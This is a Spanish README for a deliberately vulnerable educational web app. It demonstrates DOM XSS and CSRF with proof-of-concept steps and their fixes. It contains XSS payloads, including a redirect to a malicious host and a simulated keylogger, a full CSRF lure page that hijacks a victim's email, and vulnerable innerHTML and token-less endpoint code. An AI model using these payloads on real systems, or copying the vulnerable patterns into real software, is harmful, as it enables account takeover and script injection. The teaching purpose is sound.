# 🎯 MVP OWASP

## 📋 Información del Proyecto


## 🔐 Vulnerabilidades Implementadas

### 1. **XSS DOM (DOM-based Cross-Site Scripting)**
- **Ubicación:** `/search.html`
- **Descripción:** Búsqueda de productos que no sanitiza el input del usuario antes de insertarlo en el DOM
- **CWE:** CWE-79
- **CVSS Base Score:** 6.1 (Medium)
- **OWASP Top 10 2021:** A03:2021 – Injection

### 2. **CSRF (Cross-Site Request Forgery)**
- **Ubicación:** `POST /api/profile/email`
- **Descripción:** Endpoint de cambio de email sin validación de token CSRF
- **CWE:** CWE-352
- **CVSS Base Score:** 8.8 (High)
- **OWASP Top 10 2021:** A01:2021 – Broken Access Control

---

## 🏗️ Arquitectura del MVP

```
┌─────────────────┐     ┌──────────────────┐     ┌──────────────┐
│   Frontend      │────▶│   Flask API      │────▶│   SQLite     │
│   (HTML/JS)     │     │   (Python)       │     │   Database   │
└─────────────────┘     └──────────────────┘     └──────────────┘
       │
       │
       ▼
┌─────────────────┐
│  Attack Pages   │
│  (PoC CSRF)     │
└─────────────────┘
```

### **Stack Tecnológico:**
- **Backend:** Python 3.11 + Flask 3.0
- **Base de Datos:** SQLite3
- **Frontend:** HTML5 + Vanilla JavaScript
- **Containerización:** Docker + Docker Compose

### **Endpoints:**

#### Autenticación
- `POST /api/login` - Inicio de sesión
- `POST /api/logout` - Cierre de sesión
- `GET /api/session` - Verificar sesión actual

#### Vulnerables
- `POST /api/profile/email` - ❌ Cambio de email (CSRF vulnerable)
- `/search.html` - ❌ Búsqueda de productos (XSS DOM vulnerable)

#### Seguros
- `POST /api/profile/email/secure` - ✅ Cambio de email (CSRF mitigado)
- `/search-secure.html` - ✅ Búsqueda segura (XSS DOM mitigado)

---

## 📊 3.4. Historias de Usuario y Casos de Abuso

| ID | Historia de Usuario | Criterios de Aceptación | Riesgos de Abuso |
|----|---------------------|------------------------|------------------|
| **HU-01** | Como usuario, quiero buscar productos en el catálogo | - Formulario funcional<br>- Búsqueda en tiempo real<br>- Resultados mostrados dinámicamente | **XSS DOM**: Inyección de JavaScript malicioso vía parámetro URL<br>• Robo de cookies/tokens<br>• Redirección a sitios de phishing<br>• Keylogging<br>• Defacement |
| **HU-02** | Como usuario, quiero actualizar mi correo electrónico | - Formulario de cambio de email<br>- Validación de formato<br>- Confirmación de cambio | **CSRF**: Cambio no autorizado de email vía petición forjada<br>• Secuestro de cuenta<br>• Bypass de 2FA<br>• Escalación de privilegios |
| **HU-03** | Como usuario, quiero iniciar sesión de forma segura | - Autenticación con email/password<br>- Sesión persistente<br>- Hashing de contraseñas | Fuera del alcance (vulnerabilidades diferentes) |
| **HU-04** | Como administrador, quiero proteger a los usuarios de ataques | - Tokens CSRF implementados<br>- Sanitización de inputs<br>- Headers de seguridad | N/A - Historia de mitigación |

---

## 🎯 3.5. Pruebas de Concepto (PoC) Controladas

### 3.5.1. PoC XSS DOM

#### **Paso 1: Reproducir Vulnerabilidad**

1. Acceder a: `http://localhost:5000/search.html`
2. En el campo de búsqueda, ingresar:
   ```html
   <img src=x onerror=alert('XSS Exitoso!')>
   ```
3. Hacer clic en "Buscar"
4. **Resultado esperado:** ✅ Alert popup con mensaje "XSS Exitoso!"

#### **Payloads de Prueba:**

```html
<!-- 1. Alert básico -->
<img src=x onerror=alert('XSS')>

<!-- 2. Robo de cookies -->
<img src=x onerror=alert(document.cookie)>

<!-- 3. Script directo -->
<script>alert('XSS DOM')</script>

<!-- 4. Event handler -->
<body onload=alert('XSS')>

<!-- 5. SVG injection -->
<svg onload=alert('XSS')>

<!-- 6. Redirección maliciosa -->
<img src=x onerror="window.location='http://malicious.com'">

<!-- 7. Keylogger simulado -->
<img src=x onerror="document.onkeypress=function(e){console.log(e.key)}">
```

#### **Evidencia de Explotación:**

**URL maliciosa:**
```
http://localhost:5000/search.html?q=<img%20src=x%20onerror=alert(document.cookie)>
```

**Código vulnerable:**
```javascript
// ❌ VULNERABLE
resultsDiv.innerHTML = `<h3>Resultados para: ${query}</h3>`;
```

**Impacto:**
- 🔴 Robo de cookies de sesión
- 🔴 Redirección a sitios de phishing
- 🔴 Keylogging
- 🔴 Inyección de formularios falsos

---

#### **Paso 2: Mitigación**

Acceder a la versión segura: `http://localhost:5000/search-secure.html`

**Controles Implementados:**

1. **Usar `textContent` en lugar de `innerHTML`:**
```javascript
// ✅ SEGURO
resultHeader.textContent = `Resultados para: ${query}`;
```

2. **Crear elementos con `createElement`:**
```javascript
// ✅ SEGURO
const div = document.createElement('div');
div.className = 'result-header';
div.textContent = userInput;  // No interpreta HTML
resultsDiv.appendChild(div);
```

3. **Si se requiere HTML, usar DOMPurify:**
```javascript
// ✅ SEGURO con sanitización
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

4. **Content Security Policy (CSP):**
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'">
```

#### **Evidencia de Mitigación:**

Intentar el mismo payload en `/search-secure.html`:
```html
<img src=x onerror=alert('XSS')>
```

**Resultado:** ✅ El código se muestra como texto plano, no se ejecuta

---

### 3.5.2. PoC CSRF

#### **Paso 1: Reproducir Vulnerabilidad**

**Escenario de Ataque:**

1. **Víctima:** Inicia sesión en `http://localhost:5000`
   - Usuario: `victim@example.com`
   - Password: `password123`

2. **Atacante:** Crea página maliciosa y envía enlace a la víctima
   - URL: `attack/csrf-attack.html` (simula sitio externo)

3. **Víctima:** Hace clic en el enlace mientras está autenticada

4. **Resultado:** ✅ El email de la víctima cambia sin su consentimiento

#### **Código del Ataque:**

```html
<!-- Sitio del atacante: csrf-attack.html -->
<!DOCTYPE html>
<html>
<head>
    <title>¡GANA UN iPhone 15 GRATIS! 🎁</title>
</head>
<body>
    <h1>¡Felicidades! Has ganado un premio</h1>
    <button onclick="claimPrize()">RECLAMAR AHORA</button>
    
    <script>
    async function claimPrize() {
        // ❌ CSRF Attack
        await fetch('http://localhost:5000/api/profile/email', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            credentials: 'include',  // Incluye cookies de sesión
            body: JSON.stringify({
                email: 'atacante@malicious.com'
            })
        });
        alert('¡Gracias por participar!');
    }
    </script>
</body>
</html>
```

#### **Flujo del Ataque:**

```
1. Víctima logueada en localhost:5000
   └─▶ Cookie de sesión válida

2. Víctima visita csrf-attack.html
   └─▶ Hace clic en botón

3. JavaScript ejecuta fetch() con credentials: 'include'
   └─▶ Cookies se envían automáticamente

4. Servidor NO valida token CSRF
   └─▶ Procesa la petición

5. Email cambiado a atacante@malicious.com
   └─▶ ✅ Ataque CSRF exitoso
```

#### **Evidencia de Explotación:**

**Código vulnerable en el servidor:**
```python
@app.route('/api/profile/email', methods=['POST'])
def update_email_vulnerable():
    # ❌ NO HAY VALIDACIÓN DE CSRF TOKEN
    data = request.get_json()
    new_email = data.get('email')
    
    # Actualiza sin verificar origen de la petición
    cursor.execute('UPDATE users SET email = ? WHERE id = ?',
                   (new_email, session['user_id']))
```

**Impacto:**
- 🔴 Secuestro de cuenta completo
- 🔴 Cambio de contraseña vía "recuperar contraseña"
- 🔴 Acceso a información sensible
- 🔴 Realización de acciones en nombre de la víctima

---

#### **Paso 2: Mitigación**

Acceder a la versión segura: `http://localhost:5000/dashboard-secure.html`

**Controles Implementados:**

1. **Generar Token CSRF en el Login:**
```python
@app.route('/api/login', methods=['POST'])
def login():
    # ... validación de credenciales ...
    
    # ✅ Generar token CSRF único
    session['csrf_token'] = secrets.token_hex(32)
    
    return jsonify({
        'csrf_token': session['csrf_token']
    })
```

2. **Incluir Token en Peticiones:**
```javascript
// ✅ Frontend incluye token
await fetch('/api/profile/email/secure', {
    method: 'POST',
    body: JSON.stringify({
        email: newEmail,
        csrf_token: csrfToken  // ✅ Token incluido
    })
});
```

3. **Validar Token en el Servidor:**
```python
@app.route('/api/profile/email/secure', methods=['POST'])
def update_email_secure():
    data = request.get_json()
    csrf_token = data.get('csrf_token')
    
    # ✅ VALIDACIÓN DE CSRF TOKEN
    if not csrf_token or csrf_token != session.get('csrf_token'):
        return jsonify({'error': 'Token CSRF inválido'}), 403
    
    # Procesar solo si token es válido
    # ...
```

4. **Configurar SameSite Cookies:**
```python
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config['SESSION_COOKIE_SECURE'] = True  # En producción con HTTPS
```

5. **Verificar Headers Origin/Referer:**
```python
origin = request.headers.get('Origin')
referer = request.headers.get('Referer')

if origin and origin not in ALLOWED_ORIGINS:
    return jsonify({'error': 'Origen no permitido'}), 403
```

#### **Evidencia de Mitigación:**

Intentar el ataque CSRF en `/dashboard-secure.html`:

**Resultado:** ❌ Ataque bloqueado con error `403 Forbidden`

```json
{
  "error": "Token CSRF inválido o ausente"
}
```

---

## 🚀 Instalación y Ejecución

### **Opción 1: Docker (Recomendado)**

```bash
# 1. Clonar el repositorio
git clone <repo-url>
cd mvp-owasp-security

# 2. Construir y levantar contenedor
docker-compose up --build

# 3. Acceder a la aplicación
# http://localhost:5000
```

### **Opción 2: Manual**

```bash
# 1. Instalar dependencias
pip install -r requirements.txt

# 2. Ejecutar servidor
python backend/app.py

# 3. Acceder a la aplicación
# http://localhost:5000
```

---

## 👥 Usuarios de Prueba

| Email | Password | Rol | Uso |
|-------|----------|-----|-----|
| `admin@example.com` | `password123` | admin | Testing general |
| `user@example.com` | `password123` | user | Testing general |
| `victim@example.com` | `password123` | user | **PoC CSRF** |

---

## 📚 Estructura de Archivos

```
mvp-owasp-security/
├── backend/
│   ├── app.py                 # ⭐ API Flask principal
│   └── users.db               # Base de datos SQLite
├── frontend/
│   ├── index.html             # Login
│   ├── dashboard.html         # ❌ Dashboard vulnerable (CSRF)
│   ├── dashboard-secure.html  # ✅ Dashboard seguro
│   ├── search.html            # ❌ Búsqueda vulnerable (XSS DOM)
│   └── search-secure.html     # ✅ Búsqueda segura
├── attack/
│   └── csrf-attack.html       # 🎯 PoC ataque CSRF
├── docs/
│   ├── vulnerabilities.md     # Documentación técnica
│   ├── poc-csrf.md            # PoC CSRF detallado
│   └── poc-xss-dom.md         # PoC XSS DOM detallado
├── requirements.txt           # Dependencias Python
├── Dockerfile                 # Imagen Docker
├── docker-compose.yml         # Orquestación
└── README.md                  # ⭐ Este archivo
```

---

## 🧪 Guía de Testing

### **Testing Manual**

#### 1. **XSS DOM - Versión Vulnerable**
```bash
# URL: http://localhost:5000/search.html

# Test 1: Alert básico
Payload: <img src=x onerror=alert('XSS')>
Resultado esperado: ✅ Alert popup

# Test 2: Robo de cookies
Payload: <img src=x onerror=alert(document.cookie)>
Resultado esperado: ✅ Alert con cookies

# Test 3: URL con payload
URL: http://localhost:5000/search.html?q=<script>alert('XSS')</script>
Resultado esperado: ✅ Script ejecutado
```

#### 2. **XSS DOM - Versión Segura**
```bash
# URL: http://localhost:5000/search-secure.html

# Test 1: Mismo payload
Payload: <img src=x onerror=alert('XSS')>
Resultado esperado: ✅ Mostrado como texto, NO ejecutado

# Test 2: Validar textContent
Abrir DevTools > Inspeccionar elemento
Resultado esperado: ✅ Texto plano, sin tags HTML
```

#### 3. **CSRF - Versión Vulnerable**
```bash
# Paso 1: Login como víctima
URL: http://localhost:5000
Email: victim@example.com
Password: password123

# Paso 2: Abrir ataque en NUEVA PESTAÑA (sin cerrar sesión)
URL: file:///path/to/attack/csrf-attack.html

# Paso 3: Hacer clic en botón
Resultado esperado: ✅ Email cambiado a atacante@malicious.com

# Paso 4: Verificar cambio
Volver a dashboard
Resultado esperado: ✅ Email mostrado es el del atacante
```

#### 4. **CSRF - Versión Segura**
```bash
# Paso 1: Login
URL: http://localhost:5000/dashboard-secure.html

# Paso 2: Intentar ataque
URL: file:///path/to/attack/csrf-attack.html
Hacer clic en botón

# Resultado esperado: ❌ Error 403 Forbidden
Error: "Token CSRF inválido o ausente"
```

### **Testing Automatizado (Opcional)**

#### Con cURL:

```bash
# Test CSRF vulnerable
curl -X POST http://localhost:5000/api/profile/email \
  -H "Content-Type: application/json" \
  -b "session=<session-cookie>" \
  -d '{"email":"atacante@test.com"}'

# Resultado esperado: 200 OK (vulnerable)

# Test CSRF seguro
curl -X POST http://localhost:5000/api/profile/email/secure \
  -H "Content-Type: application/json" \
  -b "session=<session-cookie>" \
  -d '{"email":"atacante@test.com","csrf_token":"invalid"}'

# Resultado esperado: 403 Forbidden (protegido)
```

#### Con Burp Suite:

1. Configurar Burp como proxy (127.0.0.1:8080)
2. Interceptar petición a `/api/profile/email`
3. Modificar payload:
   ```json
   {"email":"hacker@evil.com"}
   ```
4. Forward request
5. Observar respuesta

---

## 🎓 Referencias

### OWASP
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### CWE
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-352: Cross-Site Request Forgery (CSRF)](https://cwe.mitre.org/data/definitions/352.html)

### CVSS
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)

---

## 👨‍💻 Autores

- Jarvinson Javier Valencia Yate
- Juan Diego Muñoz Ospina

---

## 📄 Licencia

Este proyecto es únicamente con fines educativos para el curso de Seguridad Ofensiva y S-SDLC.

⚠️ **DISCLAIMER:** Este MVP contiene vulnerabilidades intencionales. **NUNCA** desplegar en producción.

---

**2025**
